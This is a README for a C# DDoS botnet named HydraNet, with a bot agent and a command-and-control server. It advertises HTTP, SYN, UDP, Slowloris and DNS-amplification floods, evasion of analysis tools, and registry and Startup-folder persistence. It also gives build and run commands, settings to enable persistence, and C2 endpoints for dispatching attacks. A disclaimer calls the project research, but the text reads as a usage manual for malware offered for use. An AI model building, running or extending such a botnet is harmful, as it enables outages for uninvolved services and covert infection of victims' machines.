# DDoS Botnet

![.NET](https://img.shields.io/badge/.NET-9.0-512BD4?style=flat-square&logo=dotnet)
![C#](https://img.shields.io/badge/C%23-13-239120?style=flat-square&logo=csharp)
![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-blue?style=flat-square)
![Status](https://img.shields.io/badge/Status-Research-orange?style=flat-square)

> **HTTP/SYN/UDP/DNS Flood | C2 Panel | Bot Builder | C#**

A distributed denial-of-service research framework featuring multiple attack vectors, a command-and-control server, proxy rotation, and evasion techniques. Built for network stress-testing and DDoS mitigation research.

---

## Features

### Bot Agent
- **HTTP Flood** — Multi-threaded GET/POST flood with rotating User-Agents and proxy support
- **SYN Flood** — Raw socket TCP SYN packet generation
- **UDP Amplification** — DNS/NTP reflection via open resolvers
- **Slow Loris** — Connection exhaustion through incomplete HTTP requests
- **DNS Amplification** — ANY-record queries to amplify traffic volume
- **Proxy Pool** — Rotating proxy list with automatic dead-proxy removal
- **Process Guard** — Detects analysis tools (Wireshark, IDA, x64dbg) and exits
- **Persistence** — Registry Run key and Startup folder installation

### C2 Server
- **Bot Management** — Registration, heartbeat tracking, online/offline status
- **Attack Dispatch** — Queue-based task distribution to specific or all bots
- **Geolocation** — IP-based country lookup for bot inventory
- **REST API** — JSON-based control interface

---

## Architecture

```
src/
├── HydraNet.Bot/            # Bot agent
│   ├── Attacks/             # Attack method implementations
│   ├── Core/                # Client, command receiver, scheduler
│   ├── Config/              # Bot configuration
│   ├── Evasion/             # Anti-analysis techniques
│   ├── Models/              # Data models
│   ├── Network/             # Raw socket, proxy pool
│   ├── Persistence/         # Auto-start mechanisms
│   └── Utils/               # Header generation
└── HydraNet.C2/             # Command & Control server
    ├── Server/              # Listener, bot manager, dispatcher
    ├── Models/              # Shared models
    └── Utils/               # Geolocation
```

---

## Build Instructions

### Prerequisites
- [.NET 9 SDK](https://dotnet.microsoft.com/download/dotnet/9.0)
- Administrator privileges (for raw socket operations)

### Build
```bash
dotnet build DDoS-Botnet-CSharp.slnx
```

### Run C2 Server
```bash
cd src/HydraNet.C2
dotnet run -- 8080
```

### Run Bot Agent
```bash
cd src/HydraNet.Bot
set HYDRA_C2=http://127.0.0.1:8080
dotnet run
```

---

## Configuration

### Environment Variables (Bot)

| Variable | Description | Default |
|----------|-------------|---------|
| `HYDRA_C2` | C2 server URL | `http://127.0.0.1:8080` |
| `HYDRA_POLL` | Poll interval (seconds) | `30` |
| `HYDRA_MAX_ATTACKS` | Max concurrent attacks | `3` |
| `HYDRA_PERSIST` | Enable persistence (`1`/`0`) | `0` |
| `HYDRA_EVASION` | Enable evasion (`1`/`0`) | `1` |

---

## API Endpoints (C2)

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/api/bots/{id}/register` | Register new bot |
| GET | `/api/bots/{id}/task` | Poll for pending tasks |
| POST | `/api/bots/{id}/status` | Report task status |
| POST | `/api/attack` | Dispatch attack command |
| GET | `/api/bots` | List all registered bots |

---

## Disclaimer

This project is provided **strictly for educational and authorized security research purposes**. It demonstrates distributed system architectures, network protocol internals, and DDoS mitigation concepts. Unauthorized use of this software against systems you do not own or have explicit permission to test is illegal and unethical. The authors assume no responsibility for misuse. Always obtain proper authorization before conducting any network testing.
